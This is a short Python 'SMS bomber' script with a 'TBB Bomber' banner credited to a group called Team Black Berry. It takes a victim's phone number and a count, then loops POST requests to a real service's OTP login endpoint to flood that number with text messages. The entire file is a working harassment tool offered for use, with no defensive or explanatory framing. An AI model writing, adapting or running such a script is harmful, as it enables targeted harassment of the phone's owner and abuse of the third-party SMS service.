#Developer by Efty
import requests
from requests.structures import CaseInsensitiveDict
print("\033[H\033[J")
print("""
 
  _______ ____  ____    ____                  _               
 |__   __|  _ \|  _ \  |  _ \                | |              
    | |  | |_) | |_) | | |_) | ___  _ __ ___ | |__   ___ _ __ 
    | |  |  _ <|  _ <  |  _ < / _ \| '_ ` _ \| '_ \ / _ \ '__|
    | |  | |_) | |_) | | |_) | (_) | | | | | | |_) |  __/ |   
    |_|  |____/|____/  |____/ \___/|_| |_| |_|_.__/ \___|_|   
                                                              
                                                              

  
  
  Aouther: Alamin Hossen
  Facebook : https://www.facebook.com/Lederteamblackberry
  CEO: Team Black Berry
  
  """)                                                        

number=str(input("Enter Your Number: "))
amount=int(input("Enter Your Amount: "))
url = "https://ss.binge.buzz/otp/send/login"

headers = CaseInsensitiveDict()
headers["Content-Type"] = "application/x-www-form-urlencoded"

data = "phone="+number


for j in range(amount):
    resp = requests.post(url, headers=headers, data=data)
    print(str(j+1)+"TBB SMS SENT")
  
